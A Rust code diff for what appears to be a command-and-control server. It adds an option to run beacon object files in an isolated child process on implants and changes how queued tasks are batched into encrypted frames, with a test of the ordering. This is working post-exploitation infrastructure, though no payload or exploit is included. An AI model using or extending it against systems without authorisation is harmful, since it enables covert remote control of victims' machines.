@@ -2047,13 +2047,31 @@ fn handle_existing_session_buffer_results(
 /// MAX_WIRE_COUNT (256, protocol-internal): without it, a batch over 256
 /// tasks would have the tail silently dropped from the reply while the
 /// tasks were already dequeued.
+///
+/// B3 batch-ordering rule (protocol, Command::Bof): a Bof carrying
+/// `isolate = true` is NEVER followed by another task in the same frame —
+/// old implants decode a new-style frame by stopping after `blob`, leaving
+/// the trailing isolate byte unread, which is only safe when nothing
+/// follows. The greedy loop therefore flushes the batch it is building when
+/// an isolate Bof arrives (earlier tasks keep this frame), lets the Bof open
+/// the next frame, and closes that frame behind it.
 fn handle_existing_session_pack_tasks(
     s: &mut dashmap::mapref::one::RefMut<'_, SessionId, Session>,
 ) -> (Vec<Task>, u64) {
     let mut batch: Vec<Task> = Vec::new();
     let mut batch_plain: usize = 4; // u32 count prefix
     let mut deferred: Vec<Task> = Vec::new();
-    for t in std::mem::take(&mut s.pending) {
+    let mut pending = std::mem::take(&mut s.pending).into_iter();
+    for t in &mut pending {
+        let isolate_bof = matches!(&t.command, Command::Bof { isolate: true, .. });
+        // B3 flush: the isolate Bof may not tail this batch, so the batch
+        // ships as-is and the Bof (plus everything after it, FIFO) defers.
+        // An isolate Bof that can't fly on its own (encode error / oversize)
+        // defers like any other task below — no new head-of-line block.
+        if isolate_bof && !batch.is_empty() {
+            deferred.push(t);
+            break;
+        }
         // Encode the task alone to measure its plaintext contribution (4-byte
         // count prefix + task bytes). An encode error means it can NEVER be
         // delivered as-is, so keep it queued for the operator to split.
@@ -2069,10 +2087,19 @@ fn handle_existing_session_pack_tasks(
         {
             batch_plain += single_plain;
             batch.push(t);
+            // The isolate Bof opened this (empty) batch — close the frame
+            // behind it so nothing follows it in the same batch.
+            if isolate_bof {
+                break;
+            }
         } else {
             deferred.push(t);
         }
     }
+    // After an early B3 break, everything still in `pending` defers to
+    // subsequent frames with FIFO order intact; on natural exhaustion of
+    // the iterator this extend is a no-op.
+    deferred.extend(pending);
     s.pending = deferred;
     s.send_counter += 1;
     let counter = s.send_counter;
@@ -2350,10 +2377,16 @@ enum JsonCommand {
     },
     /// Execute a BOF/COFF object: `name` (entry label), `args`, `data_hex`
     /// (hex-encoded COFF bytes). Output streams back as a `BofOutput` result.
+    /// `isolate` (B3, optional, default false): run the BOF in a sacrificial
+    /// child process (bof-host) instead of inline in the beacon — a crashed
+    /// BOF kills the child, not the beacon. Old implants ignore the trailing
+    /// wire flag and execute inline (see Command::Bof).
     Bof {
         name: String,
         args: Vec<String>,
         data_hex: String,
+        #[serde(default)]
+        isolate: Option<bool>,
     },
     /// 文件系统操作：op ∈ {cd,mkdir,rm,mv,cp}，dest 仅 mv/cp 需要。
     FileOp {
@@ -2508,11 +2541,12 @@ fn into_command_bof_arm(cmd: JsonCommand) -> Result<Command, &'static str> {
         name,
         args,
         data_hex,
+        isolate,
     } = cmd
     else {
         return Err("internal: into_command bof arm misrouted");
     };
-    into_command_bof(name, args, data_hex)
+    into_command_bof(name, args, data_hex, isolate)
 }
 
 /// `Socks` dispatch arm — see `into_command_sleep_arm`.
@@ -2565,14 +2599,21 @@ fn into_command_upload(name: String, data_hex: String) -> Result<Command, &'stat
 }
 
 /// `Bof` decodes its hex COFF payload here; a malformed hex string is surfaced
-/// as an error for a 400 response.
+/// as an error for a 400 response. `isolate` (B3) defaults to false (inline)
+/// when the operator omits it.
 fn into_command_bof(
     name: String,
     args: Vec<String>,
     data_hex: String,
+    isolate: Option<bool>,
 ) -> Result<Command, &'static str> {
     let blob = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
-    Ok(Command::Bof { name, args, blob })
+    Ok(Command::Bof {
+        name,
+        args,
+        blob,
+        isolate: isolate.unwrap_or(false),
+    })
 }
 
 /// File-system op family: map the string op to the wire [`FileOp`].
@@ -4224,6 +4265,84 @@ mod tests {
     }
 
     #[test]
+    fn isolate_bof_packs_alone_in_its_own_frame() {
+        // B3 batch-ordering rule: a Bof with `isolate = true` MUST be the
+        // last task in its batch — old implants decode a new frame by
+        // stopping after `blob`, leaving the trailing isolate byte unread,
+        // which is only safe when nothing follows. So: (b) tasks queued
+        // before it keep their own frame, (a) the isolate Bof flies alone,
+        // (c) tasks queued after it land in a subsequent frame.
+        let st = AppState::default();
+        let pubkey = ServerKeypair::generate().unwrap().public_bytes();
+        let peer: std::net::SocketAddr = "127.0.0.1:7845".parse().unwrap();
+        let (key, checkin) = checkin_frame(&st, &pubkey, 1);
+        handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &checkin)
+            .expect("check-in must register the session");
+
+        let bof = |isolate: bool| Command::Bof {
+            name: "t.x64.o".into(),
+            args: vec!["arg".into()],
+            blob: vec![0x90u8; 16],
+            isolate,
+        };
+        {
+            let mut s = st.sessions.get_mut(&pubkey).unwrap();
+            s.pending.push(Task {
+                task_id: 1,
+                command: Command::Ping,
+            });
+            s.pending.push(Task {
+                task_id: 2,
+                command: bof(true),
+            });
+            s.pending.push(Task {
+                task_id: 3,
+                command: Command::Ping,
+            });
+            s.pending.push(Task {
+                task_id: 4,
+                command: bof(false),
+            });
+        }
+
+        let deliver = |counter: u64| {
+            let f = response_frame(&pubkey, &key, counter);
+            let reply = handle_beacon(&st, &peer, &Method::POST, &HeaderMap::new(), &f)
+                .expect("beacon must succeed");
+            let raw = nyx_protocol::parse_frame(&reply).expect("reply is a frame");
+            let plain = nyx_protocol::open_frame_dir(&key, Direction::ServerToClient, &raw)
+                .expect("reply decrypts");
+            Task::decode_vec(&plain).expect("reply is a task batch")
+        };
+
+        // (b) Task 1, queued before the isolate Bof, keeps its own frame —
+        // the Bof does not ride along at its tail.
+        let frame1 = deliver(2);
+        assert_eq!(frame1.len(), 1, "isolate Bof flushes the pending batch");
+        assert_eq!(frame1[0].task_id, 1);
+
+        // (a) The isolate Bof opens the next frame and is its only member.
+        let frame2 = deliver(3);
+        assert_eq!(frame2.len(), 1, "isolate Bof is alone in its frame");
+        assert_eq!(frame2[0].task_id, 2);
+        assert!(
+            matches!(&frame2[0].command, Command::Bof { isolate: true, .. }),
+            "isolate flag survives the wire round-trip"
+        );
+
+        // (c) Tasks queued after the isolate Bof land in a subsequent frame;
+        // a non-isolate (inline) Bof packs normally alongside them.
+        let frame3 = deliver(4);
+        assert_eq!(frame3.len(), 2);
+        assert_eq!(frame3[0].task_id, 3);
+        assert_eq!(frame3[1].task_id, 4);
+        assert!(
+            st.sessions.get(&pubkey).unwrap().pending.is_empty(),
+            "queue drained"
+        );
+    }
+
+    #[test]
     fn readmission_registers_session_from_response_batch() {
         // An implant that already registered sends a TaskResponse batch as its
         // next beacon; if the server lost the in-memory session (restart / GC)
@@ -4528,6 +4647,7 @@ mod tests {
             name: "x".into(),
             args: Vec::new(),
             data_hex: "nothex".into(),
+            isolate: None,
         }
         .into_command();
         assert!(bad_bof.is_err(), "non-hex Bof data_hex must error");
